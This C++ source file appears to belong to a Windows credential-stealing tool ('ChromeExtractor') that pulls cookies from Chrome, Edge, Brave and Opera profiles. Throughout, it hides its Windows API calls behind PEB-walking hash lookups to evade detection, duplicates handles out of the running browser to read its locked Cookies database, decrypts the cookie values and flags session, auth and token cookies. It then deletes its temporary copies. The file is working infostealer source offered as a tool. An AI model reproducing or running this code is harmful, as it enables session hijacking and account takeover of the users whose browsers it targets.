#include "cookie_extractor.h"
#include "credential_decryptor.h"
#include "logger.h"
#include "str_encrypt.h"
#include "peb_resolve.h"
#include "syscalls/syscall_resolver.h"
#include <algorithm>
#include <windows.h>
#include <cstdio>
#include <cctype>
#include <filesystem>
#include <fstream>
#include <tlhelp32.h>
#include <winternl.h>

namespace fs = std::filesystem;
using namespace ChromeExtractor::Syscalls;

#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
#define SystemHandleInformation 16

typedef struct _SYS_HANDLE_ENTRY {
    USHORT UniqueProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR  ObjectTypeIndex;
    UCHAR  HandleAttributes;
    USHORT HandleValue;
    PVOID  Object;
    ULONG  GrantedAccess;
} SYS_HANDLE_ENTRY;

typedef struct _SYS_HANDLE_INFO {
    ULONG NumberOfHandles;
    SYS_HANDLE_ENTRY Handles[1];
} SYS_HANDLE_INFO;

typedef NTSTATUS(NTAPI* pfnNtQSI)(ULONG, PVOID, ULONG, PULONG);

// ── Timeout-guarded path resolution ──────────────────────────────────────────
struct PathQuery { HANDLE h; wchar_t path[MAX_PATH]; };

static DWORD WINAPI PathQueryThread(LPVOID p) {
    auto* q = (PathQuery*)p;
    GetFinalPathNameByHandleW(q->h, q->path, MAX_PATH, VOLUME_NAME_NT);
    return 0;
}

static bool GetPathTimeout(HANDLE h, wchar_t* out, int max) {
    using FnCT  = HANDLE(WINAPI*)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
    using FnWFS = DWORD(WINAPI*)(HANDLE, DWORD);
    using FnTT  = BOOL(WINAPI*)(HANDLE, DWORD);
    using FnCH  = BOOL(WINAPI*)(HANDLE);
    constexpr DWORD kKB  = ChromeExtractor::Syscalls::PebHash("kernelbase.dll");
    constexpr DWORD kCT  = ChromeExtractor::Syscalls::PebHash("CreateThread");
    constexpr DWORD kWFS = ChromeExtractor::Syscalls::PebHash("WaitForSingleObject");
    constexpr DWORD kTT  = ChromeExtractor::Syscalls::PebHash("TerminateThread");
    constexpr DWORD kCH  = ChromeExtractor::Syscalls::PebHash("CloseHandle");
    void* hm = ChromeExtractor::Syscalls::PebGetModule(kKB);
    if (!hm) return false;
    auto pCT  = reinterpret_cast<FnCT> (ChromeExtractor::Syscalls::PebGetExport(hm, kCT));
    auto pWFS = reinterpret_cast<FnWFS>(ChromeExtractor::Syscalls::PebGetExport(hm, kWFS));
    auto pTT  = reinterpret_cast<FnTT> (ChromeExtractor::Syscalls::PebGetExport(hm, kTT));
    auto pCH  = reinterpret_cast<FnCH> (ChromeExtractor::Syscalls::PebGetExport(hm, kCH));
    if (!pCT || !pWFS) return false;

    PathQuery q = { h, {} };
    HANDLE t = pCT(nullptr, 0, PathQueryThread, &q, 0, nullptr);
    if (!t) return false;
    bool ok = (pWFS(t, 150) == WAIT_OBJECT_0);
    if (!ok && pTT) pTT(t, 0);
    if (pCH) pCH(t);
    if (ok && q.path[0]) { wcsncpy_s(out, max, q.path, _TRUNCATE); return true; }
    return false;
}

// ── Process enumeration ──────────────────────────────────────────────────────
static std::vector<DWORD> GetPIDsByName(const char* exe) {
    std::vector<DWORD> pids;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return pids;
    PROCESSENTRY32 pe = { sizeof(pe) };
    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, exe) == 0) pids.push_back(pe.th32ProcessID);
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return pids;
}

// ── Handle stealing ──────────────────────────────────────────────────────────
static HANDLE StealFileHandle(const std::string& target_path, const char* browser_exe) {
    static auto NtQSI = PebResolve<pfnNtQSI>(H_NTDLL, H_NtQSI);
    if (!NtQSI || !browser_exe) return INVALID_HANDLE_VALUE;

    using FnOP  = HANDLE(WINAPI*)(DWORD, BOOL, DWORD);
    using FnDH  = BOOL(WINAPI*)(HANDLE, HANDLE, HANDLE, LPHANDLE, DWORD, BOOL, DWORD);
    using FnGCP = DWORD(WINAPI*)();
    using FnCH  = BOOL(WINAPI*)(HANDLE);
    using FnCFW = HANDLE(WINAPI*)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
    using FnSFP = DWORD(WINAPI*)(HANDLE, LONG, PLONG, DWORD);
    constexpr DWORD kKB  = ChromeExtractor::Syscalls::PebHash("kernelbase.dll");
    constexpr DWORD kOP  = ChromeExtractor::Syscalls::PebHash("OpenProcess");
    constexpr DWORD kDH  = ChromeExtractor::Syscalls::PebHash("DuplicateHandle");
    constexpr DWORD kGCP = ChromeExtractor::Syscalls::PebHash("GetCurrentProcess");
    constexpr DWORD kCH  = ChromeExtractor::Syscalls::PebHash("CloseHandle");
    constexpr DWORD kCFW = ChromeExtractor::Syscalls::PebHash("CreateFileW");
    constexpr DWORD kSFP = ChromeExtractor::Syscalls::PebHash("SetFilePointer");
    void* hkb = ChromeExtractor::Syscalls::PebGetModule(kKB);
    if (!hkb) return INVALID_HANDLE_VALUE;
    auto pOP  = reinterpret_cast<FnOP> (ChromeExtractor::Syscalls::PebGetExport(hkb, kOP));
    auto pDH  = reinterpret_cast<FnDH> (ChromeExtractor::Syscalls::PebGetExport(hkb, kDH));
    auto pGCP = reinterpret_cast<FnGCP>(ChromeExtractor::Syscalls::PebGetExport(hkb, kGCP));
    auto pCH  = reinterpret_cast<FnCH> (ChromeExtractor::Syscalls::PebGetExport(hkb, kCH));
    auto pCFW = reinterpret_cast<FnCFW>(ChromeExtractor::Syscalls::PebGetExport(hkb, kCFW));
    auto pSFP = reinterpret_cast<FnSFP>(ChromeExtractor::Syscalls::PebGetExport(hkb, kSFP));
    if (!pOP || !pDH || !pGCP || !pCH) return INVALID_HANDLE_VALUE;

    wchar_t canon[MAX_PATH] = {};
    {
        wchar_t wide[MAX_PATH];
        MultiByteToWideChar(CP_ACP, 0, target_path.c_str(), -1, wide, MAX_PATH);
        if (pCFW) {
            HANDLE hTmp = pCFW(wide, 0,
                FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
            if (hTmp != INVALID_HANDLE_VALUE) {
                GetFinalPathNameByHandleW(hTmp, canon, MAX_PATH, VOLUME_NAME_NT);
                pCH(hTmp);
            }
        }
        if (!canon[0]) return INVALID_HANDLE_VALUE;
    }

    auto pids = GetPIDsByName(browser_exe);
    if (pids.empty()) return INVALID_HANDLE_VALUE;
    std::sort(pids.begin(), pids.end());

    std::vector<BYTE> buf(1 << 20);
    ULONG needed = 0;
    NTSTATUS st;
    for (;;) {
        st = NtQSI(SystemHandleInformation, buf.data(), (ULONG)buf.size(), &needed);
        if (st != STATUS_INFO_LENGTH_MISMATCH) break;
        buf.resize(buf.size() * 2);
    }
    if (st != 0) return INVALID_HANDLE_VALUE;

    auto* info = (SYS_HANDLE_INFO*)buf.data();
    HANDLE hProc = INVALID_HANDLE_VALUE;
    DWORD cur_pid = 0;
    HANDLE result = INVALID_HANDLE_VALUE;
    HANDLE hSelf = pGCP();
    for (ULONG i = 0; i < info->NumberOfHandles && result == INVALID_HANDLE_VALUE; i++) {
        auto& e = info->Handles[i];
        DWORD pid = e.UniqueProcessId;
        if (!std::binary_search(pids.begin(), pids.end(), pid)) continue;
        if (pid != cur_pid) {
            if (hProc != INVALID_HANDLE_VALUE) pCH(hProc);
            hProc = pOP(PROCESS_DUP_HANDLE, FALSE, pid);
            cur_pid = pid;
        }
        if (!hProc || hProc == INVALID_HANDLE_VALUE) continue;

        HANDLE dup = NULL;
        if (!pDH(hProc, (HANDLE)(ULONG_PTR)e.HandleValue,
            hSelf, &dup, GENERIC_READ, FALSE, 0)) continue;

        wchar_t path[MAX_PATH] = {};
        bool matched = GetPathTimeout(dup, path, MAX_PATH) && (_wcsicmp(path, canon) == 0);
        if (matched) {
            if (pSFP) pSFP(dup, 0, nullptr, FILE_BEGIN);
            result = dup;
        }
        else {
            pCH(dup);
        }
    }
    if (hProc != INVALID_HANDLE_VALUE) pCH(hProc);
    return result;
}

// ── Non-admin safe file copy with triple fallback ────────────────────────────
static bool CopyLockedFileSafe(const std::string& src, const std::string& dst,
    const char* browser_exe = nullptr) {
    using FnCFA = HANDLE(WINAPI*)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
    using FnRF  = BOOL(WINAPI*)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
    using FnWF  = BOOL(WINAPI*)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
    using FnCH  = BOOL(WINAPI*)(HANDLE);
    using FnDFA = BOOL(WINAPI*)(LPCSTR);
    using FnGLE = DWORD(WINAPI*)();
    constexpr DWORD kKB  = ChromeExtractor::Syscalls::PebHash("kernelbase.dll");
    constexpr DWORD kCFA = ChromeExtractor::Syscalls::PebHash("CreateFileA");
    constexpr DWORD kRF  = ChromeExtractor::Syscalls::PebHash("ReadFile");
    constexpr DWORD kWF  = ChromeExtractor::Syscalls::PebHash("WriteFile");
    constexpr DWORD kCH  = ChromeExtractor::Syscalls::PebHash("CloseHandle");
    constexpr DWORD kDFA = ChromeExtractor::Syscalls::PebHash("DeleteFileA");
    constexpr DWORD kGLE = ChromeExtractor::Syscalls::PebHash("GetLastError");
    void* hkb = ChromeExtractor::Syscalls::PebGetModule(kKB);
    if (!hkb) return false;
    auto pCFA = reinterpret_cast<FnCFA>(ChromeExtractor::Syscalls::PebGetExport(hkb, kCFA));
    auto pRF  = reinterpret_cast<FnRF> (ChromeExtractor::Syscalls::PebGetExport(hkb, kRF));
    auto pWF  = reinterpret_cast<FnWF> (ChromeExtractor::Syscalls::PebGetExport(hkb, kWF));
    auto pCH  = reinterpret_cast<FnCH> (ChromeExtractor::Syscalls::PebGetExport(hkb, kCH));
    auto pDFA = reinterpret_cast<FnDFA>(ChromeExtractor::Syscalls::PebGetExport(hkb, kDFA));
    auto pGLE = reinterpret_cast<FnGLE>(ChromeExtractor::Syscalls::PebGetExport(hkb, kGLE));
    if (!pCFA || !pRF || !pWF || !pCH) return false;

    HANDLE hSrc = pCFA(src.c_str(), GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hSrc == INVALID_HANDLE_VALUE && pGLE && pGLE() == ERROR_SHARING_VIOLATION) {
        hSrc = StealFileHandle(src, browser_exe);
    }
    if (hSrc == INVALID_HANDLE_VALUE) {
        hSrc = pCFA(src.c_str(), GENERIC_READ,
            FILE_SHARE_READ,
            nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    }
    if (hSrc == INVALID_HANDLE_VALUE) return false;

    HANDLE hDst = pCFA(dst.c_str(), GENERIC_WRITE, 0,
        nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_SEQUENTIAL_SCAN, nullptr);
    if (hDst == INVALID_HANDLE_VALUE) { pCH(hSrc); return false; }

    char buf[65536];
    DWORD rd, wr;
    bool ok = true;
    while (ok && pRF(hSrc, buf, sizeof(buf), &rd, nullptr) && rd > 0)
        ok = pWF(hDst, buf, rd, &wr, nullptr) && (wr == rd);
    pCH(hSrc);
    pCH(hDst);
    if (!ok && pDFA) pDFA(dst.c_str());
    return ok;
}

// ── CookieExtractor ──────────────────────────────────────────────────────────
CookieExtractor::CookieExtractor(const std::string& profile_path)
    : profile_path(profile_path) {
}

bool CookieExtractor::OpenDatabase() {
    std::string basePath = profile_path;
    std::replace(basePath.begin(), basePath.end(), '/', '\\');
    while (!basePath.empty() && (basePath.back() == '\\' || basePath.back() == '/'))
        basePath.pop_back();

    bool hasDefault = false;
    if (basePath.size() >= 8) {
        std::string tail = basePath.substr(basePath.size() - 8);
        std::transform(tail.begin(), tail.end(), tail.begin(), ::tolower);
        hasDefault = (tail == "\\default");
    }

    std::vector<std::string> candidates;
    if (hasDefault) {
        candidates = {
            basePath + "\\Network\\Cookies",
            basePath + "\\Cookies",
            basePath + "\\Network\\Cookies-journal",
            basePath + "\\Cookies-journal",
        };
    }
    else {
        candidates = {
            basePath + "\\Default\\Network\\Cookies",
            basePath + "\\Default\\Cookies",
            basePath + "\\Network\\Cookies",
            basePath + "\\Cookies",
        };
    }

    std::error_code ec;
    std::string partitionsDir = hasDefault
        ? basePath + "\\Partitions"
        : basePath + "\\Default\\Partitions";
    if (fs::exists(partitionsDir, ec)) {
        for (auto& entry : fs::directory_iterator(partitionsDir, ec)) {
            if (entry.is_directory()) {
                candidates.push_back(entry.path().string() + "\\Network\\Cookies");
                candidates.push_back(entry.path().string() + "\\Cookies");
            }
        }
    }

    char tmpdir[MAX_PATH] = {};
    { using FnGTPA = DWORD(WINAPI*)(DWORD, LPSTR);
      constexpr DWORD kH = ChromeExtractor::Syscalls::PebHash("kernelbase.dll");
      constexpr DWORD kF = ChromeExtractor::Syscalls::PebHash("GetTempPathA");
      void* hm = ChromeExtractor::Syscalls::PebGetModule(kH);
      if (hm) { auto f = reinterpret_cast<FnGTPA>(ChromeExtractor::Syscalls::PebGetExport(hm, kF));
                if (f) f(MAX_PATH, tmpdir); } }
    std::string pid_s = std::to_string(GetCurrentProcessId());

    const char* browser_exe = nullptr;
    if (basePath.find("\\Google\\") != std::string::npos ||
        basePath.find("\\Chrome\\") != std::string::npos)
        browser_exe = "chrome.exe";
    else if (basePath.find("\\Edge\\") != std::string::npos)
        browser_exe = "msedge.exe";
    else if (basePath.find("BraveSoftware") != std::string::npos ||
        basePath.find("Brave-Browser") != std::string::npos)
        browser_exe = "brave.exe";
    else if (basePath.find("Opera GX") != std::string::npos)
        browser_exe = "opera.exe";
    else if (basePath.find("Opera Stable") != std::string::npos ||
        basePath.find("Opera Software") != std::string::npos)
        browser_exe = "opera.exe";

    for (const auto& db_path : candidates) {
        WIN32_FIND_DATAA find_data;
        HANDLE find_handle = FindFirstFileA(db_path.c_str(), &find_data);
        if (find_handle == INVALID_HANDLE_VALUE) continue;
        FindClose(find_handle);

        std::string temp_db = std::string(tmpdir) + "cex_ck_" + pid_s + "_" +
            std::to_string(std::hash<std::string>{}(db_path)) + ".db";
        std::string wal_src = db_path + "-wal";
        std::string wal_dst = temp_db + "-wal";

        CopyLockedFileSafe(wal_src, wal_dst, browser_exe);
        if (CopyLockedFileSafe(db_path, temp_db, browser_exe) &&
            cookie_db.Open(temp_db)) {
            m_temp_db = temp_db;
            g_logger.Info("Opened Cookies database from temporary copy: " + temp_db);
            return true;
        }
        DeleteFileA(temp_db.c_str());
        DeleteFileA(wal_dst.c_str());
    }
    g_logger.Warning("Cannot open Cookies database in any candidate path under: " + basePath);
    return false;
}

std::vector<CookieEntry> CookieExtractor::ExtractCookies(CredentialDecryptor* decryptor) {
    std::vector<CookieEntry> results;
    if (!OpenDatabase()) {
        g_logger.Error("Failed to open Cookies database");
        return results;
    }

    std::string store_tag = "chromium-default";
    std::string query = R"(
        SELECT host_key, path, name, encrypted_value, expires_utc, is_secure, is_httponly, samesite
        FROM cookies
    )";
    auto rows = cookie_db.QueryWithBlob(query);
    if (rows.empty()) {
        g_logger.Warning("No cookies found in database");
        return results;
    }

    for (const auto& row : rows) {
        try {
            if (row.size() >= 7) {
                CookieEntry entry;
                entry.host_key = row[0];
                entry.path = row[1];
                entry.name = row[2];
                entry.expires = row[4];
                entry.secure = (row[5] == "1");
                entry.httponly = (row[6] == "1");
                entry.store = store_tag;

                if (row.size() >= 8 && !row[7].empty()) {
                    int ss = -1;
                    try { ss = std::stoi(row[7]); }
                    catch (...) {}
                    switch (ss) {
                    case 0:  entry.samesite = "no_restriction"; break;
                    case 1:  entry.samesite = "lax";            break;
                    case 2:  entry.samesite = "strict";         break;
                    default: entry.samesite = "unspecified";    break;
                    }
                }
                else {
                    entry.samesite = "unspecified";
                }

                if (row.size() > 3 && !row[3].empty()) {
                    std::vector<uint8_t> encrypted_binary(row[3].begin(), row[3].end());
                    if (decryptor && !encrypted_binary.empty()) {
                        entry.value = decryptor->DecryptPassword(encrypted_binary);
                    }
                }
                else {
                    entry.value = "";
                }
                results.push_back(entry);
            }
        }
        catch (const std::exception& e) {
            g_logger.Warning("Failed to parse cookie: " + std::string(e.what()));
        }
    }

    g_logger.Info("Extracted " + std::to_string(results.size()) + " cookies");
    if (!m_temp_db.empty()) {
        cookie_db.Close();
        DeleteFileA(m_temp_db.c_str());
        DeleteFileA((m_temp_db + "-wal").c_str());
        m_temp_db.clear();
    }
    return results;
}

std::vector<CookieEntry> CookieExtractor::FilterCookies(
    const std::vector<CookieEntry>& cookies,
    const std::string& domain_filter) {
    std::vector<CookieEntry> filtered;
    for (const auto& cookie : cookies) {
        if (domain_filter.empty() ||
            cookie.host_key.find(domain_filter) != std::string::npos) {
            filtered.push_back(cookie);
        }
    }
    return filtered;
}

bool CookieExtractor::IsSensitive(const CookieEntry& cookie) {
    std::string lower_name = cookie.name;
    std::transform(lower_name.begin(), lower_name.end(),
        lower_name.begin(), ::tolower);
    static const std::vector<std::string> sensitive_keywords = {
        "session", "auth", "token", "sid", "sessionid",
        "jwt", "oauth", "refresh", "cookie"
    };
    for (const auto& keyword : sensitive_keywords) {
        if (lower_name.find(keyword) != std::string::npos) {
            return true;
        }
    }
    return false;
}